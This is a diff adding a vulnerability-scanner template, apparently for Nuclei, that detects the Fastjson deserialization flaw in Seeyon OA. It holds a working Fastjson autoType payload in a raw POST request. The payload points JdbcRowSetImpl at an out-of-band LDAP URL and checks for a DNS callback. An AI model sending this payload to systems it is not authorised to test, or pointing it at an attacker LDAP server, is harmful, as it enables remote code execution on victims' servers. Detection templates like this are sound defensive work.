@@ -1,0 +1,28 @@
+id: seeyon-fastjson-oast
+
+info:
+  name: Seeyon Fastjson OAST Detection
+  author: local
+  severity: critical
+  description: Sends the documented Fastjson probe and requires an out-of-band interaction. This can cause an outbound DNS or LDAP lookup.
+  tags: seeyon,zhiyuan,fastjson,oast,active,intrusive
+
+http:
+  - raw:
+      - |
+        POST /seeyon/main.do?method=changeLocale HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        _json_params={"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}","autoCommit":true}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
+      - type: word
+        part: body
+        words:
+          - 'com.alibaba.fastjson.JSONException'
+
